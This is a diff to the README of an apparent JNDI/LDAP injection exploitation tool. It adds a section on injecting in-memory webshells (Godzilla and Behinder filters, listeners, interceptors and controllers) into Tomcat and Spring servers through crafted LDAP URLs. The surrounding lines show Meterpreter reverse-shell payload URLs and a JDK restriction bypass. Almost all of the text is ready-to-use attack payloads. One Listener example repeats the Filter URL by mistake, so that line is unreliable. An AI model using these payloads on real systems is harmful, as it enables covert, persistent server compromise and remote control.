@@ -76,6 +76,29 @@ ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
+## MemShell Injection
+
+Based on the [MemShellParty](https://github.com/ReaJason/MemShellParty) project
+
+Currently only supports injecting memShells through Basic/BeanFactory routes
+
+```bash
+# Format
+ldap://127.0.0.1:1389/Basic/MemShell/{server}/{tool}/{type}
+
+# Tomcat Godzilla Filter
+ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
+# Tomcat Godzilla Listener
+ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
+
+# Spring Web MVC Behinder Interceptor
+ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/Interceptor
+# Spring Web MVC Behinder Controller
+ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
+
+# For more information on memory management types, see the MemShellParty README
+```
+
 ## BeanFactory Bypass
 
 Bypass restrictions on higher JDK versions using BeanFactory. The Tomcat version must be earlier than 8.5.79 or 9.0.63
